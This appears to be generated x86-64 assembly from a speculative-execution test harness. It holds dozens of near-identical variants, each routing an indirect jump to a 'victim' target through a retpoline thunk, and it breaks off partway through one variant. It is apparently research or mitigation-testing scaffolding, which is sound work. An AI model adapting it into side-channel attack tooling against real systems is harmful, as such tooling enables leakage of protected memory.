## Variant 261
.Lvictim_win0_var261:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000261
	jmp	.Lgg_retpol_after_000261
.Lgg_retpol_thunk_000261:
	callq	.Lgg_retpol_setup_000261
.Lgg_retpol_cap_000261:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000261
.Lgg_retpol_setup_000261:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000261:
	jmp	.Lvictim_win0_continue
## Variant 262
.Lvictim_win0_var262:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000262
	jmp	.Lgg_retpol_after_000262
.Lgg_retpol_thunk_000262:
	callq	.Lgg_retpol_setup_000262
.Lgg_retpol_cap_000262:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000262
.Lgg_retpol_setup_000262:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000262:
	jmp	.Lvictim_win0_continue
## Variant 263
.Lvictim_win0_var263:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000263
	jmp	.Lgg_retpol_after_000263
.Lgg_retpol_thunk_000263:
	callq	.Lgg_retpol_setup_000263
.Lgg_retpol_cap_000263:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000263
.Lgg_retpol_setup_000263:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000263:
	jmp	.Lvictim_win0_continue
## Variant 264
.Lvictim_win0_var264:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000264
	jmp	.Lgg_retpol_after_000264
.Lgg_retpol_thunk_000264:
	callq	.Lgg_retpol_setup_000264
.Lgg_retpol_cap_000264:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000264
.Lgg_retpol_setup_000264:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000264:
	jmp	.Lvictim_win0_continue
## Variant 265
.Lvictim_win0_var265:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000265
	jmp	.Lgg_retpol_after_000265
.Lgg_retpol_thunk_000265:
	callq	.Lgg_retpol_setup_000265
.Lgg_retpol_cap_000265:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000265
.Lgg_retpol_setup_000265:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000265:
	jmp	.Lvictim_win0_continue
## Variant 266
.Lvictim_win0_var266:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000266
	jmp	.Lgg_retpol_after_000266
.Lgg_retpol_thunk_000266:
	callq	.Lgg_retpol_setup_000266
.Lgg_retpol_cap_000266:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000266
.Lgg_retpol_setup_000266:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000266:
	jmp	.Lvictim_win0_continue
## Variant 267
.Lvictim_win0_var267:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000267
	jmp	.Lgg_retpol_after_000267
.Lgg_retpol_thunk_000267:
	callq	.Lgg_retpol_setup_000267
.Lgg_retpol_cap_000267:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000267
.Lgg_retpol_setup_000267:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000267:
	jmp	.Lvictim_win0_continue
## Variant 268
.Lvictim_win0_var268:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000268
	jmp	.Lgg_retpol_after_000268
.Lgg_retpol_thunk_000268:
	callq	.Lgg_retpol_setup_000268
.Lgg_retpol_cap_000268:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000268
.Lgg_retpol_setup_000268:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000268:
	jmp	.Lvictim_win0_continue
## Variant 269
.Lvictim_win0_var269:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000269
	jmp	.Lgg_retpol_after_000269
.Lgg_retpol_thunk_000269:
	callq	.Lgg_retpol_setup_000269
.Lgg_retpol_cap_000269:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000269
.Lgg_retpol_setup_000269:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000269:
	jmp	.Lvictim_win0_continue
## Variant 270
.Lvictim_win0_var270:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000270
	jmp	.Lgg_retpol_after_000270
.Lgg_retpol_thunk_000270:
	callq	.Lgg_retpol_setup_000270
.Lgg_retpol_cap_000270:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000270
.Lgg_retpol_setup_000270:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000270:
	jmp	.Lvictim_win0_continue
## Variant 271
.Lvictim_win0_var271:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000271
	jmp	.Lgg_retpol_after_000271
.Lgg_retpol_thunk_000271:
	callq	.Lgg_retpol_setup_000271
.Lgg_retpol_cap_000271:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000271
.Lgg_retpol_setup_000271:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000271:
	jmp	.Lvictim_win0_continue
## Variant 272
.Lvictim_win0_var272:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000272
	jmp	.Lgg_retpol_after_000272
.Lgg_retpol_thunk_000272:
	callq	.Lgg_retpol_setup_000272
.Lgg_retpol_cap_000272:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000272
.Lgg_retpol_setup_000272:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000272:
	jmp	.Lvictim_win0_continue
## Variant 273
.Lvictim_win0_var273:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000273
	jmp	.Lgg_retpol_after_000273
.Lgg_retpol_thunk_000273:
	callq	.Lgg_retpol_setup_000273
.Lgg_retpol_cap_000273:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000273
.Lgg_retpol_setup_000273:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000273:
	jmp	.Lvictim_win0_continue
## Variant 274
.Lvictim_win0_var274:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000274
	jmp	.Lgg_retpol_after_000274
.Lgg_retpol_thunk_000274:
	callq	.Lgg_retpol_setup_000274
.Lgg_retpol_cap_000274:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000274
.Lgg_retpol_setup_000274:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000274:
	jmp	.Lvictim_win0_continue
## Variant 275
.Lvictim_win0_var275:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000275
	jmp	.Lgg_retpol_after_000275
.Lgg_retpol_thunk_000275:
	callq	.Lgg_retpol_setup_000275
.Lgg_retpol_cap_000275:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000275
.Lgg_retpol_setup_000275:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000275:
	jmp	.Lvictim_win0_continue
## Variant 276
.Lvictim_win0_var276:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000276
	jmp	.Lgg_retpol_after_000276
.Lgg_retpol_thunk_000276:
	callq	.Lgg_retpol_setup_000276
.Lgg_retpol_cap_000276:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000276
.Lgg_retpol_setup_000276:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000276:
	jmp	.Lvictim_win0_continue
## Variant 277
.Lvictim_win0_var277:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000277
	jmp	.Lgg_retpol_after_000277
.Lgg_retpol_thunk_000277:
	callq	.Lgg_retpol_setup_000277
.Lgg_retpol_cap_000277:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000277
.Lgg_retpol_setup_000277:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000277:
	jmp	.Lvictim_win0_continue
## Variant 278
.Lvictim_win0_var278:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000278
	jmp	.Lgg_retpol_after_000278
.Lgg_retpol_thunk_000278:
	callq	.Lgg_retpol_setup_000278
.Lgg_retpol_cap_000278:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000278
.Lgg_retpol_setup_000278:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000278:
	jmp	.Lvictim_win0_continue
## Variant 279
.Lvictim_win0_var279:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000279
	jmp	.Lgg_retpol_after_000279
.Lgg_retpol_thunk_000279:
	callq	.Lgg_retpol_setup_000279
.Lgg_retpol_cap_000279:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000279
.Lgg_retpol_setup_000279:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000279:
	jmp	.Lvictim_win0_continue
## Variant 280
.Lvictim_win0_var280:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000280
	jmp	.Lgg_retpol_after_000280
.Lgg_retpol_thunk_000280:
	callq	.Lgg_retpol_setup_000280
.Lgg_retpol_cap_000280:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000280
.Lgg_retpol_setup_000280:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000280:
	jmp	.Lvictim_win0_continue
## Variant 281
.Lvictim_win0_var281:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000281
	jmp	.Lgg_retpol_after_000281
.Lgg_retpol_thunk_000281:
	callq	.Lgg_retpol_setup_000281
.Lgg_retpol_cap_000281:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000281
.Lgg_retpol_setup_000281:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000281:
	jmp	.Lvictim_win0_continue
## Variant 282
.Lvictim_win0_var282:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000282
	jmp	.Lgg_retpol_after_000282
.Lgg_retpol_thunk_000282:
	callq	.Lgg_retpol_setup_000282
.Lgg_retpol_cap_000282:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000282
.Lgg_retpol_setup_000282:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000282:
	jmp	.Lvictim_win0_continue
## Variant 283
.Lvictim_win0_var283:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000283
	jmp	.Lgg_retpol_after_000283
.Lgg_retpol_thunk_000283:
	callq	.Lgg_retpol_setup_000283
.Lgg_retpol_cap_000283:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000283
.Lgg_retpol_setup_000283:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000283:
	jmp	.Lvictim_win0_continue
## Variant 284
.Lvictim_win0_var284:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000284
	jmp	.Lgg_retpol_after_000284
.Lgg_retpol_thunk_000284:
	callq	.Lgg_retpol_setup_000284
.Lgg_retpol_cap_000284:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000284
.Lgg_retpol_setup_000284:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000284:
	jmp	.Lvictim_win0_continue
## Variant 285
.Lvictim_win0_var285:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000285
	jmp	.Lgg_retpol_after_000285
.Lgg_retpol_thunk_000285:
	callq	.Lgg_retpol_setup_000285
.Lgg_retpol_cap_000285:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000285
.Lgg_retpol_setup_000285:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000285:
	jmp	.Lvictim_win0_continue
## Variant 286
.Lvictim_win0_var286:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000286
	jmp	.Lgg_retpol_after_000286
.Lgg_retpol_thunk_000286:
	callq	.Lgg_retpol_setup_000286
.Lgg_retpol_cap_000286:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000286
.Lgg_retpol_setup_000286:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000286:
	jmp	.Lvictim_win0_continue
## Variant 287
.Lvictim_win0_var287:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000287
	jmp	.Lgg_retpol_after_000287
.Lgg_retpol_thunk_000287:
	callq	.Lgg_retpol_setup_000287
.Lgg_retpol_cap_000287:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000287
.Lgg_retpol_setup_000287:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000287:
	jmp	.Lvictim_win0_continue
## Variant 288
.Lvictim_win0_var288:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000288
	jmp	.Lgg_retpol_after_000288
.Lgg_retpol_thunk_000288:
	callq	.Lgg_retpol_setup_000288
.Lgg_retpol_cap_000288:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000288
.Lgg_retpol_setup_000288:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000288:
	jmp	.Lvictim_win0_continue
## Variant 289
.Lvictim_win0_var289:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000289
	jmp	.Lgg_retpol_after_000289
.Lgg_retpol_thunk_000289:
	callq	.Lgg_retpol_setup_000289
.Lgg_retpol_cap_000289:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000289
.Lgg_retpol_setup_000289:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000289:
	jmp	.Lvictim_win0_continue
## Variant 290
.Lvictim_win0_var290:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000290
	jmp	.Lgg_retpol_after_000290
.Lgg_retpol_thunk_000290:
	callq	.Lgg_retpol_setup_000290
.Lgg_retpol_cap_000290:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000290
.Lgg_retpol_setup_000290:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000290:
	jmp	.Lvictim_win0_continue
## Variant 291
.Lvictim_win0_var291:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000291
	jmp	.Lgg_retpol_after_000291
.Lgg_retpol_thunk_000291:
	callq	.Lgg_retpol_setup_000291
.Lgg_retpol_cap_000291:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000291
.Lgg_retpol_setup_000291:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000291:
	jmp	.Lvictim_win0_continue
## Variant 292
.Lvictim_win0_var292:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000292
	jmp	.Lgg_retpol_after_000292
.Lgg_retpol_thunk_000292:
	callq	.Lgg_retpol_setup_000292
.Lgg_retpol_cap_000292:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000292
.Lgg_retpol_setup_000292:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000292:
	jmp	.Lvictim_win0_continue
## Variant 293
.Lvictim_win0_var293:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000293
	jmp	.Lgg_retpol_after_000293
.Lgg_retpol_thunk_000293:
	callq	.Lgg_retpol_setup_000293
.Lgg_retpol_cap_000293:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000293
.Lgg_retpol_setup_000293:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000293:
	jmp	.Lvictim_win0_continue
## Variant 294
.Lvictim_win0_var294:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000294
	jmp	.Lgg_retpol_after_000294
.Lgg_retpol_thunk_000294:
	callq	.Lgg_retpol_setup_000294
.Lgg_retpol_cap_000294:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000294
.Lgg_retpol_setup_000294:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000294:
	jmp	.Lvictim_win0_continue
## Variant 295
.Lvictim_win0_var295:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000295
	jmp	.Lgg_retpol_after_000295
.Lgg_retpol_thunk_000295:
	callq	.Lgg_retpol_setup_000295
.Lgg_retpol_cap_000295:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000295
.Lgg_retpol_setup_000295:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000295:
	jmp	.Lvictim_win0_continue
## Variant 296
.Lvictim_win0_var296:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000296
	jmp	.Lgg_retpol_after_000296
.Lgg_retpol_thunk_000296:
	callq	.Lgg_retpol_setup_000296
.Lgg_retpol_cap_000296:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000296
.Lgg_retpol_setup_000296:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000296:
	jmp	.Lvictim_win0_continue
## Variant 297
.Lvictim_win0_var297:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000297
	jmp	.Lgg_retpol_after_000297
.Lgg_retpol_thunk_000297:
	callq	.Lgg_retpol_setup_000297
.Lgg_retpol_cap_000297:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000297
.Lgg_retpol_setup_000297:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000297:
	jmp	.Lvictim_win0_continue
## Variant 298
.Lvictim_win0_var298:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000298
	jmp	.Lgg_retpol_after_000298
.Lgg_retpol_thunk_000298:
	callq	.Lgg_retpol_setup_000298
.Lgg_retpol_cap_000298:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000298
.Lgg_retpol_setup_000298:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000298:
	jmp	.Lvictim_win0_continue
## Variant 299
.Lvictim_win0_var299:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000299
	jmp	.Lgg_retpol_after_000299
.Lgg_retpol_thunk_000299:
	callq	.Lgg_retpol_setup_000299
.Lgg_retpol_cap_000299:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000299
.Lgg_retpol_setup_000299:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000299:
	jmp	.Lvictim_win0_continue
## Variant 300
.Lvictim_win0_var300:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000300
	jmp	.Lgg_retpol_after_000300
.Lgg_retpol_thunk_000300:
	callq	.Lgg_retpol_setup_000300
.Lgg_retpol_cap_000300:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000300
.Lgg_retpol_setup_000300:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000300:
	jmp	.Lvictim_win0_continue
## Variant 301
.Lvictim_win0_var301:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000301
	jmp	.Lgg_retpol_after_000301
.Lgg_retpol_thunk_000301:
	callq	.Lgg_retpol_setup_000301
.Lgg_retpol_cap_000301:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000301
.Lgg_retpol_setup_000301:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000301:
	jmp	.Lvictim_win0_continue
## Variant 302
.Lvictim_win0_var302:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000302
	jmp	.Lgg_retpol_after_000302
.Lgg_retpol_thunk_000302:
	callq	.Lgg_retpol_setup_000302
.Lgg_retpol_cap_000302:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000302
.Lgg_retpol_setup_000302:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000302:
	jmp	.Lvictim_win0_continue
## Variant 303
.Lvictim_win0_var303:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000303
	jmp	.Lgg_retpol_after_000303
.Lgg_retpol_thunk_000303:
	callq	.Lgg_retpol_setup_000303
.Lgg_retpol_cap_000303:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000303
.Lgg_retpol_setup_000303:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000303:
	jmp	.Lvictim_win0_continue
## Variant 304
.Lvictim_win0_var304:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000304
	jmp	.Lgg_retpol_after_000304
.Lgg_retpol_thunk_000304:
	callq	.Lgg_retpol_setup_000304
.Lgg_retpol_cap_000304:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000304
.Lgg_retpol_setup_000304:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000304:
	jmp	.Lvictim_win0_continue
## Variant 305
.Lvictim_win0_var305:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000305
	jmp	.Lgg_retpol_after_000305
.Lgg_retpol_thunk_000305:
	callq	.Lgg_retpol_setup_000305
.Lgg_retpol_cap_000305:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000305
.Lgg_retpol_setup_000305:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000305:
	jmp	.Lvictim_win0_continue
## Variant 306
.Lvictim_win0_var306:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000306
	jmp	.Lgg_retpol_after_000306
.Lgg_retpol_thunk_000306:
	callq	.Lgg_retpol_setup_000306
.Lgg_retpol_cap_000306:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000306
.Lgg_retpol_setup_000306:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000306:
	jmp	.Lvictim_win0_continue
## Variant 307
.Lvictim_win0_var307:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000307
	jmp	.Lgg_retpol_after_000307
.Lgg_retpol_thunk_000307:
	callq	.Lgg_retpol_setup_000307
.Lgg_retpol_cap_000307:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000307
.Lgg_retpol_setup_000307:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000307:
	jmp	.Lvictim_win0_continue
## Variant 308
.Lvictim_win0_var308:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000308
	jmp	.Lgg_retpol_after_000308
.Lgg_retpol_thunk_000308:
	callq	.Lgg_retpol_setup_000308
.Lgg_retpol_cap_000308:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000308
.Lgg_retpol_setup_000308:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000308:
	jmp	.Lvictim_win0_continue
## Variant 309
.Lvictim_win0_var309:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000309
	jmp	.Lgg_retpol_after_000309
.Lgg_retpol_thunk_000309:
	callq	.Lgg_retpol_setup_000309
.Lgg_retpol_cap_000309:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000309
.Lgg_retpol_setup_000309:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000309:
	jmp	.Lvictim_win0_continue
## Variant 310
.Lvictim_win0_var310:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000310
	jmp	.Lgg_retpol_after_000310
.Lgg_retpol_thunk_000310:
	callq	.Lgg_retpol_setup_000310
.Lgg_retpol_cap_000310:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000310
.Lgg_retpol_setup_000310:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000310:
	jmp	.Lvictim_win0_continue
## Variant 311
.Lvictim_win0_var311:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000311
	jmp	.Lgg_retpol_after_000311
.Lgg_retpol_thunk_000311:
	callq	.Lgg_retpol_setup_000311
.Lgg_retpol_cap_000311:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000311
.Lgg_retpol_setup_000311:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000311:
	jmp	.Lvictim_win0_continue
## Variant 312
.Lvictim_win0_var312:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000312
	jmp	.Lgg_retpol_after_000312
.Lgg_retpol_thunk_000312:
	callq	.Lgg_retpol_setup_000312
.Lgg_retpol_cap_000312:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000312
.Lgg_retpol_setup_000312:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000312:
	jmp	.Lvictim_win0_continue
## Variant 313
.Lvictim_win0_var313:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
